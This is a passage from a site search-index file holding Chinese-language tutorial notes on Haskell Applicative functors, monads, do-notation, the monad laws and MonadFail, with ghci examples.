)]","title":"ZipList"},{"location":"cs/pl/haskell/#applicative-functor-laws","text":"\u5e94\u7528\u51fd\u5b50\u4e00\u822c\u6709\u56db\u4e2a\u5b9a\u5f8b\uff0c\u90fd\u662f\u4fdd\u8bc1 pure \u7684\u6b63\u786e\u6027\u7684\uff1a Identity law \uff1apure id <*> v = v Homomorphism \uff1apure f <*> pure x = pure (f x) Interchange \uff1au < > pure v = pure ($ v) < > u Composition \uff1au < > (v < > w) = pure (.) < > u < > v <*> w","title":"Applicative Functor Laws"},{"location":"cs/pl/haskell/#intuition_1","text":"\u7406\u89e3\u5e94\u7528\u51fd\u5b50\u7684\u65b9\u5f0f\u4e5f\u662f\u5c06\u5176\u770b\u4f5c\u662f\u8ba1\u7b97\u4e0a\u4e0b\u6587\uff08context\uff09\uff0c\u6bd4\u5982\u8981\u8ba1\u7b97\uff1a \\[ [[\\ \\ g\\ x_1\\ x_2\\ \\cdots\\ x_n\\ \\ ]] \\] \u5176\u4e2d \\(x_i\\) \u7684\u7c7b\u578b\u662f \\(f\\ t_i\\) \uff0c \\(f\\) \u662f\u5e94\u7528\u51fd\u5b50\uff08\u770b\u4f5c\u4e0a\u4e0b\u6587\uff09\u3002\u800c\u51fd\u6570 \\(g\\) \u7684\u7c7b\u578b\u662f\uff1a \\[ t_1\\to t_2\\to\\cdots\\to t_n\\to t \\] \u6240\u4ee5\u53cc\u62ec\u53f7\uff08idiom brackets\uff09\u7684\u4f5c\u7528\u662f\u5c06\u4e00\u4e2a\u666e\u901a\u51fd\u6570\u5e94\u7528\u5728\u5305\u542b\u5728\u4e0a\u4e0b\u6587\u4e2d\u7684\u53c2\u6570\u4e0a\u3002 \\(g\\ x_1\\) \u53ef\u4ee5\u901a\u8fc7 fmap \u6765\u6267\u884c\uff0c\u5c06 \\(g\\) \u63d0\u5347\uff08lift\uff09\u5230 \\(x_1\\) \u7684\u4e0a\u4e0b\u6587\u4e2d\uff0c\u7136\u540e\u5e94\u7528\u5728 \\(x_1\\) \u4e0a\u3002\u4f46\u662f fmap \u8fd4\u56de\u7684\u7ed3\u679c\u662f\u4e00\u4e2a\u51fd\u5b50\uff0c\u6362\u53e5\u8bdd\u8bf4\uff0c \\(g\\ x_1\\) \u7ed3\u679c\u7684\u7c7b\u578b\u662f\uff1a \\[ f\\ \\ (t_2\\to t_3\\to\\cdots\\to t_n\\to t) \\] \u4f46\u662f fmap \u5e76\u4e0d\u80fd\u5c06\u4e0a\u4e0b\u6587\u4e2d\u7684\u51fd\u6570\u5e94\u7528\u5728\u4e0a\u4e0b\u6587\u4e2d\u7684\u53c2\u6570\u4e0a\uff0c\u4e8e\u662f\u5e94\u7528\u51fd\u5b50\u7684 <*> \u51fd\u6570\u63d0\u4f9b\u4e86\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u6240\u4ee5\u8ba1\u7b97 \\([[\\ g\\ x_1\\ x_2\\ \\cdots\\ x_n\\ ]]\\) \uff0c\u53ea\u9700\u8981\uff1a g < $> x1 < *> x2 < *> ... < *> xn \u800c pure \u51fd\u6570\u7684\u4f5c\u7528\u5c31\u662f\u5c06\u4e00\u4e2a\u4e0d\u5728\u4e0a\u4e0b\u6587\u4e2d\u7684\u503c\uff08\u51fd\u6570\u6216\u53c2\u6570\uff09\u63d0\u5347\u5230\u4e0a\u4e0b\u6587\u4e2d\uff0c\u4f46\u4e0d\u8fdb\u884c\u5176\u4ed6\u64cd\u4f5c\u3002\u6bd4\u5982\u53c2\u6570 \\(x_2\\) \u5982\u679c\u4e0d\u5728\u4e0a\u4e0b\u6587\u4e2d\uff0c\u9700\u8981\u7528 pure \u63d0\u5347\u5230\u4e0a\u4e0b\u6587\u4e2d\u624d\u80fd\u6309\u4e0a\u9762\u8ba1\u7b97\uff1a g < $> x1 < *> pure x2 < *> ... < *> xn","title":"Intuition"},{"location":"cs/pl/haskell/#_14","text":"","title":"\u5e38\u7528\u51fd\u6570"},{"location":"cs/pl/haskell/#lifta-lifta2-lifta3","text":"liftA :: Applicative f => (a -> b) -> f a -> f b liftA2 :: Applicative f => (a -> b -> c) -> f a -> f b -> f c liftA3 :: Applicative f => (a -> b -> c -> d) -> f a -> f b -> f c -> f d \u4e0d\u96be\u63a8\u6d4b liftA \u5c31\u662f fmap\uff0c liftA2 f x1 x2 \u76f8\u5f53\u4e8e f <$> x1 <*> x2 \uff0c liftA3 f x1 x2 x3 \u76f8\u5f53\u4e8e f <$> x1 <*> x2 <*> x3","title":"liftA &amp; liftA2 &amp; liftA3"},{"location":"cs/pl/haskell/#_15","text":"\u7c7b\u578b\u7c7b\u4f3c\u51fd\u5b50\u7684 <$ \u548c $> \uff1a (<*) :: Applicative f => f a -> f b -> f a (*>) :: Applicative f => f a -> f b -> f b <* \u63a5\u6536\u4e24\u4e2a\u51fd\u5b50\uff0c\u5982\u679c\u4e24\u4e2a\u51fd\u5b50\u4e2d\u53c8\u4e00\u4e2a\u4e3a\u7a7a\uff0c\u5c31\u8fd4\u56de\u7a7a\uff0c\u5426\u5219\u8fd4\u56de\u7684\u7c7b\u578b\u4e0e\u7b2c\u4e00\u4e2a\u51fd\u5b50\u76f8\u540c\u3002*> \u53cd\u8fc7\u6765 ghci > Just 3 <* Just 4 Just 3 ghci > Just 3 *> Just 4 Just 4 ghci > Nothing <* Just 3 Nothing ghci > Nothing *> Just 3 Nothing ghci > [ 1 , 2 , 3 ] <* [ 3 , 4 ] [ 1 , 1 , 2 , 2 , 3 , 3 ] ghci > [ 1 , 2 , 3 ] *> [ 3 , 4 ] [ 3 , 4 , 3 , 4 , 3 , 4 ] ghci > [] <* [ 1 , 2 , 3 ] [] ghci > [] *> [ 1 , 2 , 3 ] []","title":"&lt;* &amp; *&gt;"},{"location":"cs/pl/haskell/#_16","text":"( < **>) :: Applicative f => f a -> f (a -> b) -> f b \u63a5\u6536\u7684\u53c2\u6570\u662f <*> \u53cd\u8f6c\u8fc7\u6765\u7684\uff0c\u5373\u5148\u63a5\u6536\u4e00\u4e2a\u53c2\u6570\u51fd\u5b50\uff0c\u7136\u540e\u63a5\u6536\u4e00\u4e2a\u51fd\u6570\u51fd\u5b50\uff0c\u5728\u5c06\u5176\u5e94\u7528\u8fd4\u56de\u3002\u4f46\u662f\u548c flip(<*>) \u4e0d\u540c\uff0c\u5b83\u5148\u53d6\u53c2\u6570\u51fd\u5b50\u7684\u6bcf\u4e2a\u53c2\u6570\uff0c\u7136\u540e\u518d\u53d6\u51fd\u6570\u51fd\u5b50\u4e2d\u7684\u51fd\u6570\u9010\u4e2a\u5e94\u7528\uff1a ghci > [( + 1 ), ( + 2 ), ( + 3 )] <*> [ 1 , 2 ] [ 2 , 3 , 3 , 4 , 4 , 5 ] ghci > [ 1 , 2 ] <**> [( + 1 ), ( + 2 ), ( + 3 )] [ 2 , 3 , 4 , 3 , 4 , 5 ] ghci > flip ( <*> ) [ 1 , 2 ] [( + 1 ), ( + 2 ), ( + 3 )] [ 2 , 3 , 3 , 4 , 4 , 5 ]","title":"&lt;**&gt;"},{"location":"cs/pl/haskell/#when-unless","text":"when :: Applicative f => Bool -> f () -> f () \u4f20\u5165\u7684\u7b2c\u4e00\u4e2a\u662f\u4e00\u4e2a\u7ed3\u679c\u4e3a Bool \u7c7b\u578b\u7684\u6d4b\u8bd5\uff0c\u5982\u679c\u6d4b\u8bd5\u4e3a True\uff0c\u5219\u8c03\u7528\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5426\u5219\u8fd4\u56de pure ()\u3002\uff08when \u51fd\u6570\u5728\u4e0a\u6587 IO \u64cd\u4f5c\u4e2d\u4f7f\u7528\u8fc7\uff09 unless \u5219\u4e0e when \u76f8\u53cd\uff0c\u6d4b\u8bd5\u4e3a True \u8fd4\u56de pure ()","title":"when &amp; unless"},{"location":"cs/pl/haskell/#sequencea","text":"sequenceA :: (Traversable t, Applicative f) => t (f a) -> f (t a) \u5e94\u7528\u5728\u5217\u8868\u4e0a\u65f6\uff0c\u5b83\u7684\u7c7b\u578b\u76f8\u5f53\u4e8e\uff1a [f a] -> f [a] \u6240\u4ee5\u5728\u5217\u8868\u4e0a\u5b83\u7684\u4f7f\u7528\u65b9\u6cd5\uff1a ghci > sequenceA [ Just 3 , Just 2 , Just 1 ] Just [ 3 , 2 , 1 ] ghci > sequenceA [ Just 3 , Nothing , Just 1 ] Nothing ghci > sequenceA [( + 3 ),( + 2 ),( + 1 )] 3 [ 6 , 5 , 4 ] ghci > sequenceA [[ 1 , 2 , 3 ],[ 4 , 5 , 6 ]] [[ 1 , 4 ],[ 1 , 5 ],[ 1 , 6 ],[ 2 , 4 ],[ 2 , 5 ],[ 2 , 6 ],[ 3 , 4 ],[ 3 , 5 ],[ 3 , 6 ]] ghci > sequenceA [[ 1 , 2 , 3 ],[ 4 , 5 , 6 ],[ 3 , 4 , 4 ], [] ] [] \u5b83\u5728\u5bf9\u540c\u4e00\u4e2a\u53c2\u6570\u5e94\u7528\u4e0d\u540c\u51fd\u6570\u65f6\u5f88\u6709\u7528\uff1a ghci > map ( \\ f -> f 7 ) [( > 4 ), ( < 10 ), odd ] [ True , True , True ] ghci > sequenceA [( > 4 ), ( < 10 ), odd ] 7 [ True , True , True ]","title":"sequenceA"},{"location":"cs/pl/haskell/#monad","text":"\u5355\u5b50\uff08Monad\uff09\u662f\u5bf9 Applicative Functor \u7684\u6269\u5c55\uff08\u4f46\u662f\u8bde\u751f\u6bd4 Applicative \u65e9\uff09\uff0cFunctor \u7684 <$> \u51fd\u6570\u5b9e\u73b0\u4e86\u5c06\u666e\u901a\u51fd\u6570\u5e94\u7528\u5728\u4e0a\u4e0b\u6587\u503c\u4e0a\uff0cApplicative \u7684 <*> \u51fd\u6570\u5c06\u4e0a\u4e0b\u6587\u4e2d\u51fd\u6570\u5e94\u7528\u5728\u4e0a\u4e0b\u6587\u503c\u4e0a\u3002\u800c Monad \u63d0\u4f9b\u4e86\u4e00\u4e2a\u51fd\u6570 >>= \uff08bind\uff09\uff0c\u5c06\u4e00\u4e2a\u63a5\u6536\u666e\u901a\u503c\u8fd4\u56de\u4e0a\u4e0b\u6587\u503c\u7684\u51fd\u6570\u5e94\u7528\u5728\u4e0a\u4e0b\u6587\u503c\u4e0a\uff1a class Applicative m => Monad m where ( >>= ) :: m a -> ( a -> m b ) -> m b ( >> ) :: m a -> m b -> m b return :: a -> m a m >> n = m >>= \\ _ -> n return = pure return \u51fd\u6570\uff1a\u548c pure \u4e00\u6837\uff0c\u53ea\u662f\u6709\u53e6\u4e00\u4e2a\u540d\u5b57 >> \u51fd\u6570\uff1a\u63d0\u4f9b\u4e86\u9ed8\u8ba4\u7684\u5b9e\u73b0\u65b9\u6cd5\uff0c\u5b83\u7684\u4f5c\u7528\u548c Applicative \u7684 *> \u51fd\u6570\u4e00\u6837 >>= \u51fd\u6570\uff08bind\uff09\uff1a\u6bd4 Applicative \u5347\u7ea7\u7684\u51fd\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u5355\u5b50\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u63a5\u6536\u503c\u8fd4\u56de\u5355\u5b50\u7684\u51fd\u6570\uff0c\u5c06\u8fd9\u4e2a\u51fd\u6570\u5e94\u7528\u5728\u7b2c\u4e00\u4e2a\u53c2\u6570\u5355\u5b50\u4e2d\u7684\u503c\u4e0a\uff0c\u5e76\u8fd4\u56de\u5f97\u5230\u7684\u65b0\u5355\u5b50","title":"Monad"},{"location":"cs/pl/haskell/#monad_1","text":"","title":"Monad \u5b9e\u4f8b"},{"location":"cs/pl/haskell/#maybe_2","text":"Maybe \u662f\u4e00\u4e2a\u5355\u5b50\u5b9e\u4f8b\uff0cApplicative \u5df2\u7ecf\u4e3a\u5b83\u5b9e\u73b0\u4e86 return\uff0c\u56e0\u6b64\u53ea\u9700\u8981 >>= \u51fd\u6570\uff1a instance Monad Maybe where ( Just x ) >>= f = f x Nothing >>= _ = Nothing \u6839\u636e\u5b9a\u4e49\u5c31\u5f88\u5bb9\u6613\u5b9e\u73b0 Maybe \u7684 >>= \u51fd\u6570\u4e86\uff0c\u800c\u4e14\u4e5f\u5f88\u597d\u7406\u89e3 ghci > Just 1 >>= \\ x -> Just ( x + 1 ) Just 2 ghci > Just 1 >>= \\ x -> return ( x + 1 ) Just 2 ghci > Nothing >>= \\ x -> Just ( x + 1 ) Nothing ghci > Just 1 >>= \\ x -> Just ( x + 1 ) >> Nothing >>= \\ y -> Just ( y + 1 ) Nothing \u6700\u540e\u4e00\u4e2a\u4f8b\u5b50\u4e2d\u51fa\u73b0\u4e86 >> Nothing\uff0c\u8fd9\u65f6 Nothing \u524d\u7684\u90e8\u5206\u5168\u90fd\u76f8\u5f53\u4e8e\u6ca1\u7528\uff0c\u56e0\u4e3a >> \u64cd\u4f5c\u7b26\u7684\u5de6\u53f3\u4e24\u8fb9\u53ea\u8981\u6709\u4e00\u4e2a\u51fa\u73b0 Nothing\uff0c\u90a3\u6574\u4f53\u5c31\u4f1a\u662f Nothing\u3002\u8fd9\u4e2a\u7279\u6027\u53ef\u4ee5\u7528\u4e8e\u5728\u4e2d\u9014\u968f\u65f6\u5224\u65ad\u5931\u8bef\uff0c\u53ea\u8981\u6709\u4e00\u5904\u5931\u8bef\uff0c\u7ed3\u679c\u5c31\u4f1a\u662f Nothing","title":"Maybe"},{"location":"cs/pl/haskell/#_17","text":"\u5217\u8868\u4e5f\u662f\u4e00\u4e2a\u5355\u5b50\uff1a instance Monad [] where xs >>= f = concat ( map f xs ) \u5c06\u8fd9\u4e2a\u51fd\u6570\u5e94\u7528\u5728 xs \u7684\u6bcf\u4e2a\u503c\u4e0a\uff0c\u5c06\u8fd4\u56de\u7684\u6240\u6709\u5217\u8868\u5e73\u94fa\u6210\u4e00\u4e2a\u5217\u8868\uff1a ghci > [ 3 , 4 , 5 ] >>= \\ x -> [ x , - x ] [ 3 , - 3 , 4 , - 4 , 5 , - 5 ] ghci > [ 1 , 2 ] >>= \\ n -> [ 'a' , 'b' ] >>= \\ ch -> return ( n , ch ) [( 1 , 'a' ),( 1 , 'b' ),( 2 , 'a' ),( 2 , 'b' )]","title":"[]"},{"location":"cs/pl/haskell/#io_3","text":"IO \u4e5f\u662f\u4e00\u4e2a\u5355\u5b50\uff0c\u4f46\u662f\u5b9e\u73b0\u65b9\u6cd5\u6bd4\u8f83\u6df1\u5965\uff08\u9003","title":"IO"},{"location":"cs/pl/haskell/#-r_2","text":"(->) r \u4e5f\u662f\u4e00\u4e2a\u5355\u5b50\uff0c\u548c Functor\u3001Applicative \u4e00\u6837\uff0c\u5148\u5206\u6790\u5b83\u7684 >>= \u7c7b\u578b\u7b7e\u540d\uff1a (>>=) :: (-> r) a -> (a -> (-> r) b) -> (-> r) b (>>=) :: (r -> a) -> (a -> r -> b) -> (r -> b) \u4e5f\u53ef\u4ee5\u770b\u51fa\u6765\uff0c\u5b83\u63a5\u6536\u4e24\u4e2a\u51fd\u6570 f :: r -> a\u3001g :: a -> r -> b\uff0c\u7136\u540e\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u51fd\u6570 h :: r -> b \u90a3\u4e48\u51fd\u6570 h \u63a5\u6536\u4e00\u4e2a\u7c7b\u578b\u4e3a r \u7684\u53c2\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u7c7b\u578b\u4e3a b \u7684\u503c\u3002\u6240\u4ee5\u5148\u5bf9\u8f93\u5165\u5e94\u7528 f \u5f97\u5230\u7c7b\u578b\u4e3a a \u7684\u4e2d\u95f4\u503c\uff0c\u7136\u540e\u518d\u5c06\u8fd9\u4e2a\u503c\u548c\u8f93\u5165\u53c2\u6570\u4e00\u8d77\u4f20\u5165\u51fd\u6570 g \u5f97\u5230\u7ed3\u679c\u3002\u6240\u4ee5\u51fd\u6570 h \u7684\u5b9a\u4e49\u5e94\u8be5\u662f\uff1a \\x -> g (f x) x instance Monad (( -> ) r ) where f >>= g = \\ x -> g ( f x ) x ghci > ( + 3 ) >>= ( + ) $ 1 5 ghci > ( + ) <$> ( + 3 ) <*> id $ 1 5","title":"(-&gt;) r"},{"location":"cs/pl/haskell/#do-notation","text":"Haskell \u7684 do \u8bed\u53e5\u4e3a\u94fe\u5f0f\u7684 >>= \u5e94\u7528\u63d0\u4f9b\u4e86\u7c7b\u4f3c\u547d\u4ee4\u5f0f\uff08imperative style\uff09\u7684\u8bed\u6cd5\u7cd6\u3002\u6bd4\u5982 a >>= \\x -> b >> c >>= \\y -> d \uff1a a >>= \\ x -> b >> c >>= \\ y -> d \u5176\u4e2d\u6709 abcd \u56db\u4e2a\u503c\uff0c\u53ef\u4ee5\u770b\u51fa a \u4e2d\u5185\u5bb9\u7ed1\u5b9a\u5230\u4e86 x \u4e0a\uff0cc \u4e2d\u5185\u5bb9\u7ed1\u5b9a\u5230\u4e86 y \u4e0a\u3002\u4f7f\u7528 do \u8bed\u53e5\u6765\u8868\u793a\u8fd9\u4e2a\u64cd\u4f5c\u53ef\u4ee5\u5199\u6210\uff1a do { x <- a ; b ; y <- c ; d } \u5176\u4e2d\u7684\u5927\u62ec\u53f7\u548c\u5206\u53f7\u53ef\u4ee5\u7701\u7565\u4e0d\u5199\uff08\u6324\u5728\u4e00\u884c\u65f6\u4e0d\u80fd\u7701\u7565\uff09\u3002do \u8bed\u53e5\u4e5f\u53ea\u662f\u4e00\u4e2a\u8bed\u6cd5\u7cd6\uff0c\u5b83\u53ef\u4ee5\u9012\u5f52\u5730\u8f6c\u6362\u6210\u666e\u901a\u7684 Monad \u64cd\u4f5c\u8bed\u53e5\uff1a do e \uff1ae do { e; ... } \uff1ae >> do { ... } do { v <- e; ... } \uff1ae >>= \\v -> do { ... } do { let ...; ... } \uff1alet ... in do { ... }","title":"do-notation"},{"location":"cs/pl/haskell/#applicativedo","text":"\u6bd4\u5982\u5982\u4e0b\u4e00\u4e2a do \u8bed\u53e5\uff1a do x <- a y <- b z <- c return ( f x y z ) \u5b83\u53ef\u4ee5\u8f6c\u5316\u6210\uff1a a >>= \\x -> b >>= \\y -> c >>= \\z -> return (f x y z) \u4f46\u662f\u7ecf\u8fc7\u89c2\u5bdf\u53ef\u4ee5\u53d1\u73b0\uff0c\u6574\u4e2a\u8bed\u53e5\u5b9e\u9645\u4e0a\u5c06\u51fd\u6570 f \u5e94\u7528\u5728\u4e86\u4e09\u4e2a\u4e0a\u4e0b\u6587\u4e2d\u7684\u503c\u4e0a\uff0c\u6240\u4ee5\u4ec5\u7528 Applicative \u7684 <$> \u548c <*> \u5b8c\u5168\u53ef\u4ee5\u5b9e\u73b0\uff1a f < $> a < *> b < *> c \u800c\u4e14\u5728\u8fd0\u884c\u7684\u65f6\u5019 Applicative \u7684\u6548\u7387\u4f1a\u6bd4 Monad \u9ad8\uff0c\u6240\u4ee5 Haskell \u4f1a\u5c06 do \u8bed\u53e5\u5c3d\u53ef\u80fd\u4f18\u5148\u8f6c\u6362\u4e3a Applicative \u7684\u8868\u793a\u65b9\u6cd5\u7136\u540e\u518d\u8ba1\u7b97","title":"ApplicativeDo"},{"location":"cs/pl/haskell/#monad-laws","text":"Left identity \uff1areturn a >>= k = k a Right identity \uff1am >>= return = m Associativity \uff1a(m >>= g) >>= h = m >>= (\\x -> g x >>= h) \u524d\u4e24\u4e2a\u5b9a\u5f8b\u5f88\u597d\u7406\u89e3\uff1a \u5c06 a \u6ce8\u5165\u4e0a\u4e0b\u6587\u4e4b\u540e\u7ed1\u5b9a\uff08bind\uff09\u7ed9\u51fd\u6570 k(:: a -> m a)\uff0c\u76f8\u5f53\u4e8e\u76f4\u63a5\u5c06 a \u76f4\u63a5\u4f20\u5165\u51fd\u6570 k \u5c06\u5df2\u7ecf\u5305\u542b\u5728\u4e0a\u4e0b\u6587\u4e2d\u7684\u503c\u7ed1\u5b9a\u7ed9 return \u51fd\u6570\uff0c\u76f8\u5f53\u4e8e\u4fdd\u6301\u4e0d\u53d8 \u7b2c\u4e09\u4e2a\u5b9a\u5f8b\u662f\u7ed3\u5408\u5f8b\uff0c\u628a\u5b83\u5199\u6210\u66f4\u50cf\u7ed3\u5408\u5f8b\u7684\u8868\u793a\u65b9\u6cd5\u662f\uff1a (m >>= (\\x -> g x)) >>= h = m >>= (\\x -> g x >>= h)","title":"Monad Laws"},{"location":"cs/pl/haskell/#_18","text":"Control.Monad \u6a21\u5757\u4e2d\u8fd8\u5b9a\u4e49\u4e86\u51fd\u6570 >=> \uff08Kleisli-composition operator\uff09\uff1a infixr 1 >=> ( >=> ) :: Monad m => ( a -> m b ) -> ( b -> m c ) -> ( a -> m c ) f >=> g = \\ x -> f x >>= g \u4f7f\u7528 >=> \u8fd0\u7b97\u7b26\u53ef\u4ee5\u5c06\u4e24\u4e2a\u7528\u4e8e\u7ed1\u5b9a\u7684\u51fd\u6570\u7ed3\u5408\u5728\u4e00\u8d77\u3002\u7528\u5b83\u8868\u793a\u7684 Monad \u5b9a\u5f8b\u66f4\u52a0\u6e05\u6670\u76f4\u89c2\uff1a Left identity \uff1areturn >=> f = f Right identity \uff1af >=> return = f Associativity \uff1a(f >=> g) >=> h = f >=> (g >=> h)","title":"\u7ec4\u5408\u8fd0\u7b97\u7b26\uff08&gt;=&gt;\uff09\u5f62\u5f0f"},{"location":"cs/pl/haskell/#do-notation_1","text":"Monad \u7684\u8fd9\u4e09\u4e2a\u5b9a\u5f8b\u8fd8\u53ef\u4ee5\u4f7f\u7528 do \u8bed\u53e5\u6765\u63cf\u8ff0\uff1a Left identity \uff1a do { x' <- return x ; f x' = do { f x } } Right identity \uff1a do { x <- m ; return x = do { m } } Associativity \uff1a do { y <- do { x <- m ; do { x <- m ; do { x <- m ; f x do { y <- f x ; y <- f x ; } = g y = g y g y } } } }","title":"do-notation \u5f62\u5f0f"},{"location":"cs/pl/haskell/#intuition_2","text":"Monad \u4e5f\u53ef\u4ee5\u5f88\u81ea\u7136\u5730\u770b\u6210 Applicative \u7684\u5347\u7ea7\u7248\uff0c\u6bd4\u5982 Applicative \u7684\u64cd\u4f5c\u5168\u90e8\u662f\u56fa\u5b9a\u7684\uff0c\u800c Monad \u7684\u64cd\u4f5c\u53ef\u4ee5\u5728\u4e2d\u9014\u7a81\u7136\u6539\u53d8 \u540c\u65f6 Monad \u4e5f\u5b8c\u6210\u4e86 Functor \u548c Applicative \u65e0\u6cd5\u5b8c\u6210\u7684\u64cd\u4f5c\u3002\u6bd4\u5982\u8981\u7528 fmap \u548c\u5b9e\u73b0 >>= \u51fd\u6570\uff08\u5373\u8fbe\u6210\u64cd\u4f5c m a -> (a -> m b) -> m b\uff09\uff0c\u5148\u5047\u8bbe f :: a -> m b\uff0c\u90a3\u4e48 fmap f \u7684\u7c7b\u578b\u5c31\u4f1a\u662f m a -> m (m b)\uff0c\u5c06 m a \u5e94\u7528\u5728 fmap f \u4e0a\u4f1a\u5f97\u5230\u7ed3\u679c m (m b)\uff0c\u800c\u4e0d\u662f m b\u3002\u4f46\u662f\u76ee\u524d\u53ea\u53ef\u4ee5\u4f7f\u7528 pure \u5c06\u4e00\u4e2a\u503c\u88c5\u5165\u4e0a\u4e0b\u6587\u4e2d\uff08a -> m a\uff09\uff0c\u800c\u6ca1\u6709\u4e00\u4e2a\u51fd\u6570\u53ef\u4ee5\u4ece\u4e0a\u4e0b\u6587\u4e2d\u63d0\u53d6\u503c\uff08m a -> a\uff09\u3002\u90a3\u4e48\u5c31\u9700\u8981\u5b9a\u4e49\u4e00\u4e2a\u65b0\u7684\u51fd\u6570\u6765\u5b9e\u73b0\u8fd9\u4e2a\u64cd\u4f5c\u7684\u6548\u679c\uff08m (m b) -> m b\uff09\u3002\u56e0\u6b64 Monad \u7684\u53e6\u4e00\u4e2a\u7b49\u6548\u7684\u5b9a\u4e49\u65b9\u6cd5\u662f\uff1a class Applicative m => Monad' m where join :: m ( m a ) -> m a ( >>= ) :: m a -> ( a -> m b ) -> m b x >>= f = join $ fmap f x \u4f46\u662f\u5b9a\u4e49 >>= \u51fd\u6570\u4f1a\u66f4\u4e3a\u76f4\u89c2\u65b9\u4fbf\uff0c\u6240\u4ee5 Haskell \u91c7\u7528\u4e86\u7528 >>= \u51fd\u6570\u5b9a\u4e49 Monad \u7684\u65b9\u6cd5 \u540c\u65f6 Haskell \u8fd8\u63d0\u4f9b\u4e86 join \u51fd\u6570\u7684\u5b9a\u4e49\uff1a join :: Monad m => m ( m a ) -> m a join x = x >>= id","title":"Intuition"},{"location":"cs/pl/haskell/#_19","text":"","title":"\u5e38\u7528\u51fd\u6570"},{"location":"cs/pl/haskell/#liftm-ap","text":"liftM :: Monad m => (a -> b) -> m a -> m b ap :: Monad m => m (a -> b) -> m a -> m b \u6240\u4ee5 liftM \u5176\u5b9e\u5c31\u662f fmap\u3001ap \u5c31\u662f <*>\uff0c\u4f46\u662f\u8001\u7248\u672c\u7684 GHC \u5b9a\u4e49 Monad \u5e76\u6ca1\u6709 Functor\u3001Applicative \u7684\u7ea6\u675f\uff0c\u6240\u4ee5\u5b9e\u73b0\u4e86 liftM\u3001ap\uff0c\u5e76\u4e14\u4fdd\u7559\u4e86\u8fd9\u4e2a\u540d\u5b57 \u56e0\u6b64\u4e00\u4e2a\u5355\u5b50\u4e5f\u53ef\u4ee5\u901a\u8fc7 pure = return \u3001 (<*>) = ap \u76f4\u63a5\u6210\u4e3a\u5e94\u7528\u51fd\u5b50\u7684\u5b9e\u4f8b","title":"liftM &amp; ap"},{"location":"cs/pl/haskell/#sequence_1","text":"sequence :: Monad m => [m a] -> m [a] sequence \u7684\u4f5c\u7528\u663e\u800c\u6613\u89c1\uff0c\u800c\u4e14\u5728 IO \u90e8\u5206\u4e5f\u4f7f\u7528\u5230\u4e86\u3002\u4f46\u662f\u8fd9\u4e2a\u7248\u672c\u662f\u5728 GHC.Base \u6a21\u5757\u4e2d\u5b9a\u4e49\u7684\uff0c\u8fd8\u6709\u4e00\u4e2a\u66f4\u5e7f\u6cdb\u7684\u4f7f\u7528 Traversable \u7684\u5b9a\u4e49\u5728 Data.Traversable \u6a21\u5757\u4e2d","title":"sequence"},{"location":"cs/pl/haskell/#replicatem","text":"replicateM :: Applicative m => Int -> m a -> m [a]","title":"replicateM"},{"location":"cs/pl/haskell/#mapm-form","text":"mapM :: Monad m => (a -> m b) -> [a] -> m [b] forM :: Monad m => [a] -> (a -> m b) -> m [b] forM \u7684\u7528\u6cd5\u5728 IO \u90e8\u5206\u5df2\u7ecf\u8bf4\u8fc7\uff0cmapM \u548c forM \u90fd\u5728 Data.Traversable \u6a21\u5757\u4e2d\u6709\u5e7f\u6cdb\u7248\u672c \u8fd8\u6709\u4e00\u4e9b\u5176\u4ed6\u7684\u51fd\u6570\uff1afilterM\u3001zipWithM\u3001foldM\u3001forever\uff0c\u901a\u8fc7\u540d\u5b57\u5c31\u53ef\u4ee5\u770b\u51fa\u7528\u6cd5\uff0c\u662f\u5c06\u539f\u6765\u4ec5\u4f7f\u7528\u4e0e\u5217\u8868\u7684\u51fd\u6570\u63d0\u5347\u81f3\u53ef\u4ee5\u9002\u7528\u4e8e\u6240\u6709\u5355\u5b50 \u5e76\u4e14\u5728\u51fd\u6570\u540d\u540e\u52a0\u4e0b\u5212\u7ebf\uff0c\u6bd4\u5982 sequence_\u3001mapM_\uff0c\u4f1a\u5ffd\u7565\u8fd4\u56de\u503c\uff08\u6700\u7ec8\u7ed3\u679c\u4e3a m () \uff09","title":"mapM &amp; forM"},{"location":"cs/pl/haskell/#_20","text":"\uff08 >=> \u64cd\u4f5c\u7b26\u5728\u4e0a\u9762 Monad Laws \u90e8\u5206\u5df2\u7ecf\u7ed9\u51fa\u4e86\u5b9a\u4e49\uff09 - x >>= f = f =<< x - f >=> g = g <=< f","title":"=&lt;&lt; &amp; &gt;=&gt; &amp; &lt;=&lt;"},{"location":"cs/pl/haskell/#monadfail","text":"MonadFail \u5b9a\u4e49\u5728 Control.Monad.Fail \u6a21\u5757\u4e2d\uff1a class Monad m => MonadFail m where fail :: String -> m a \u5b83\u53ea\u8981\u6c42\u5728 Monad \u7684\u57fa\u7840\u4e0a\u5b9e\u73b0 fail \u51fd\u6570\uff0c\u63a5\u6536\u4e00\u4e2a\u5b57\u7b26\u4e32\u8fd4\u56de\u4e00\u4e2a\u5355\u5b50\u3002\u8fd9\u4f1a\u4f7f\u5728 do \u8bed\u53e5\u4e2d\u4ea7\u751f\u9519\u8bef\u65f6\u76f4\u63a5\u53d8\u4e3a\u9519\u8bef\u503c\uff08\u7a7a\u503c\uff09\u4f7f\u6700\u7ec8\u7684\u8fd4\u56de\u503c\u4e3a\u9519\u8bef\u503c","title":"MonadFail"},{"location":"cs/pl/haskell/#monadfail_1","text":"instance MonadFail Maybe where fail _ = Nothing instance MonadFail [] where fail _ = [] instance MonadFail IO where fail = failIO Maybe \u548c [] \u7684 fail \u51fd\u6570\u90fd\u4e0e\u7b2c\u4e00\u4e2a\u53c2\u6570\u65e0\u5173\uff0c\u76f4\u63a5\u8fd4\u56de\u7a7a\u503c\uff08Nothing\u3001[]\uff09\uff1b\u800c IO \u7684 fail \u51fd\u6570\u76f4\u63a5\u4f7f\u7528 failIO\uff0c\u5b9e\u73b0\u65b9\u6cd5\u4e5f\u662f\u6df1\u5965\uff08\u63a5\u7740\u9003 exampleFail :: Maybe Char exampleFail = do ( x : xs ) <- Just \"\" return x ghci > exampleFail Nothing \u5728\u8fd9\u4e2a\u4f8b\u5b50\u7684 do \u8bed\u53e5\u4e2d\uff0c\u5728\u63d0\u53d6 Just \"\" 